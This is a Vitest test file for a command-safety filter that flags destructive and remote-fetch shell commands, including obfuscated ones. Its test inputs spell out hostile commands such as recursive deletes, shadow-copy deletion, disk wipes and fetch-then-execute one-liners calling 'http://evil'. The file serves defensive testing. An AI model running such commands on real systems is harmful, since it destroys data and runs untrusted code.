import { describe, it, expect } from 'vitest';
import { isDestructiveCmd, normalizeCmd, DESTRUCTIVE_RE } from './security';

describe('security / isDestructiveCmd — Windows cmd delete verbs (v1.7.211 gap fix)', () => {
    it('flags del / erase with arguments', () => {
        expect(isDestructiveCmd('del /f /s /q C:\\Users\\x\\Documents')).toBe(true);
        expect(isDestructiveCmd('erase important.txt')).toBe(true);
        expect(isDestructiveCmd('DEL C:\\data\\*.*')).toBe(true);   // case-insensitive
    });

    it('flags recursive directory removal (rmdir / rd /s)', () => {
        expect(isDestructiveCmd('rmdir /s /q C:\\temp')).toBe(true);
        expect(isDestructiveCmd('rd /s /q C:\\important')).toBe(true);
    });

    it('flags shadow-copy deletion (anti-recovery)', () => {
        expect(isDestructiveCmd('vssadmin delete shadows /all /quiet')).toBe(true);
        // ...but a read of the same tool is fine
        expect(isDestructiveCmd('vssadmin list shadows')).toBe(false);
    });

    it('flags disk wipe / partition tools', () => {
        expect(isDestructiveCmd('Clear-Disk -Number 1 -RemoveData')).toBe(true);
        expect(isDestructiveCmd('diskpart')).toBe(true);
        expect(isDestructiveCmd('cipher /w:C')).toBe(true);
    });
});

describe('security / isDestructiveCmd — pre-existing coverage still holds', () => {
    it('flags PowerShell mutators + format + shutdown', () => {
        expect(isDestructiveCmd('Remove-Item -Recurse -Force C:\\x')).toBe(true);
        expect(isDestructiveCmd('Stop-Service Spooler')).toBe(true);
        expect(isDestructiveCmd('Format-Volume -DriveLetter D')).toBe(true);
        expect(isDestructiveCmd('format c:')).toBe(true);
        expect(isDestructiveCmd('shutdown /r /t 0')).toBe(true);
        expect(isDestructiveCmd('reg delete HKLM\\Software\\X')).toBe(true);
        expect(isDestructiveCmd('rm -rf /var/log')).toBe(true);
    });
});

describe('security / isDestructiveCmd — benign commands are NOT flagged', () => {
    it('leaves read-only / safe commands alone', () => {
        expect(isDestructiveCmd('Get-Process')).toBe(false);
        expect(isDestructiveCmd('Get-ChildItem -Path C:\\Users')).toBe(false);
        expect(isDestructiveCmd('Get-WinEvent -FilterHashtable @{LogName="System"}')).toBe(false);
        expect(isDestructiveCmd('ipconfig /all')).toBe(false);
        expect(isDestructiveCmd('Get-Service | Where-Object Status -eq Running')).toBe(false);
    });

    it('does not false-positive on files/paths that merely contain "del"', () => {
        // `\b(?:del|erase)\s` requires the verb followed by whitespace, so a
        // file named del.log or a path segment \del\ is not mistaken for a delete.
        expect(isDestructiveCmd('Get-Content C:\\logs\\del.log')).toBe(false);
        expect(isDestructiveCmd('Get-Content C:\\del\\readme.txt')).toBe(false);
        expect(isDestructiveCmd('Get-Item model.ps1')).toBe(false);
    });

    it('handles empty / nullish input', () => {
        expect(isDestructiveCmd('')).toBe(false);
        // @ts-expect-error runtime guards null even though the type says string
        expect(isDestructiveCmd(null)).toBe(false);
    });
});

describe('security / normalizeCmd — obfuscation is defeated before matching', () => {
    it('strips PowerShell backtick escapes so `del` is still caught', () => {
        expect(normalizeCmd('d`el /q x')).toBe('del /q x');
        expect(isDestructiveCmd('d`el /q C:\\x')).toBe(true);
    });

    it('strips cmd caret escapes', () => {
        expect(isDestructiveCmd('r^d /s /q C:\\x')).toBe(true);
    });

    it('collapses string concatenation', () => {
        expect(normalizeCmd("'Remove'+'-Item'")).toContain('Remove-Item');
    });

    it('expands env vars used to hide system paths', () => {
        expect(normalizeCmd('%SystemRoot%\\System32')).toContain('C:\\Windows');
    });
});

describe('security / isDestructiveCmd — remote-code-fetch / download verbs (v1.7.232 C3)', () => {
    it('flags download-to-disk and fetch-then-execute primitives', () => {
        expect(isDestructiveCmd('iwr http://evil/p.ps1 -OutFile $env:TEMP\\p.ps1')).toBe(true);
        expect(isDestructiveCmd('Invoke-WebRequest https://x/a.exe -OutFile a.exe')).toBe(true);
        expect(isDestructiveCmd('Invoke-RestMethod https://x/s | iex')).toBe(true);
        expect(isDestructiveCmd('iex (New-Object Net.WebClient).DownloadString("http://x")')).toBe(true);
        expect(isDestructiveCmd('certutil -urlcache -split -f http://x/a.exe a.exe')).toBe(true);
        expect(isDestructiveCmd('Start-BitsTransfer -Source http://x/a -Destination a')).toBe(true);
        expect(isDestructiveCmd('curl http://x -o C:\\a.exe')).toBe(true);
        expect(isDestructiveCmd('wget http://x -O a')).toBe(true);
    });
    it('still leaves plain read-only PowerShell alone', () => {
        // sanity: the download alternation did not broaden Get-*/Select-* etc.
        expect(isDestructiveCmd('Get-Process | Select-Object Name,CPU')).toBe(false);
    });
});

describe('security / DESTRUCTIVE_RE is exported and is a RegExp', () => {
    it('is usable directly', () => {
        expect(DESTRUCTIVE_RE).toBeInstanceOf(RegExp);
        expect(DESTRUCTIVE_RE.flags).toContain('i');
    });
});
